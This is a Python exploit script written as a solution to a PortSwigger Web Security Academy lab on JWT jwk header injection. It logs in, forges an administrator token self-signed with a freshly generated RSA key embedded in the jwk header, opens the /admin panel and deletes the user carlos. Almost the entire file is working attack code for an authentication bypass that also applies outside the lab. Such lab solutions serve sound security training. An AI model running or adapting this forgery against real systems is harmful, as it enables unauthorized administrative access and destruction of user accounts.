#!/usr/bin/env python3
"""
JWT authentication bypass via jwk header injection
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 04-jwk-header-injection.md

What this does:
    Logs in to get a genuine RS256 session JWT, generates a fresh 2048-bit
    RSA key pair, embeds the public half directly in the JWT header as a
    "jwk" object (with a matching "kid"), and signs the token with the
    private half. If the server resolves its verification key from the
    token's own jwk header instead of a fixed server-side keystore, the
    signature verifies -- because it's being checked against exactly the
    key we supplied. Sending that as the session cookie to /admin, then
    deleting carlos, solves the lab.

Usage:
    python 04-jwk-header-injection.py <lab-url>
    e.g. python 04-jwk-header-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx cryptography
"""

import base64
import json
import re
import sys
import httpx

from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def exploit_forge_jwk_injection(jwt_token: str, new_claims: dict) -> str:
    """Generate a fresh RSA key pair, embed its public half as the jwk header, sign with the private half."""
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()
    pub_numbers = public_key.public_numbers()

    def _int_to_b64url(n: int) -> str:
        byte_len = (n.bit_length() + 7) // 8
        return _b64url_encode(n.to_bytes(byte_len, "big"))

    jwk = {
        "kty": "RSA",
        "e": _b64url_encode(pub_numbers.e.to_bytes((pub_numbers.e.bit_length() + 7) // 8, "big")),
        "n": _int_to_b64url(pub_numbers.n),
        "kid": "exploit-key",
    }

    header, payload, _ = decode_jwt(jwt_token)
    payload.update(new_claims)
    header["alg"] = "RS256"
    header["jwk"] = jwk
    header["kid"] = "exploit-key"

    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    forged = exploit_forge_jwk_injection(session, {"sub": "administrator"})
    print(f"[+] Forged token with embedded jwk (fresh RSA key pair, self-signed)")

    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
